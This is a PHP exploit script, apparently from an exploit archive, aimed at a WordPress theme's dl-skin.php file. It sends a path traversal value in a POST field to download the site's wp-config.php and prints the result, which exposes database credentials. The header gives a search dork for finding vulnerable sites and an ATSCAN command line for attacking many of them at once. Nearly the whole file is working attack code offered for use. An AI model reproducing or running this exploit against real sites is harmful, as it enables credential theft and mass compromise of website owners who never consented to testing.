<?php
/*
 ====================================================================
 WORDPRESS AFD dl-skin.php Exploit
 ====================================================================
   CODED BY: Ali Mehdioui.
   GROUP: Alisam Technology.
   //
   DORK: index of /lib/scripts/dl-skin.php
   //
   USE: 
   php dl-skin-exploit.php http://site.com/wp-content/themes/THEME NAME/lib/scripts/dl-skin.php
   //
   ATSCAN MASS USE:
   atscan -d "index of /lib/scripts/dl-skin.php" -l 20 -m 2 --replace "scripts" --with "scripts/dl-skin.php" --command "php exploit.php --TARGET" --full  --ifinurl "lib/scripts"  
 ====================================================================
*/
  print "
      [+]================================================================[+]
      [+]-------------  Wordpress AFD dl-skin.php Exploit  --------------[+]
      [+]--------------          Alisam Technology         --------------[+]
      [+]------ https://www.fb.com/Forces.des.tempetes.marocaines  ------[+]
      [+]------        https://www.youtube.com/user/aliartes       ------[+]
      [+]================================================================[+]
	  
  ";
  if (!isset($argv[1])) {echo "Usage: php dl-skin-exploit.php http://site.com/wp-content/themes/THEME NAME/lib/scripts/dl-skin.php\n"; exit;}
  $ur = isset($argv[1]) && strstr($argv[1], 'http') ? $argv[1] : "http://{$argv[1]}";
  $argv[1] = $ur;
  $data_to_post = array();
  $data_to_post['_mysite_download_skin'] = '../../../../../wp-config.php';

  $curl = curl_init();
  curl_setopt($curl,CURLOPT_URL, $ur);
  curl_setopt($curl,CURLOPT_POST, sizeof($data_to_post));
  curl_setopt($curl,CURLOPT_POSTFIELDS, $data_to_post);
  $result = curl_exec($curl);
  echo $result;
  curl_close($curl);
  
/*
 ====================================================================
  End
 ====================================================================
*/
?>
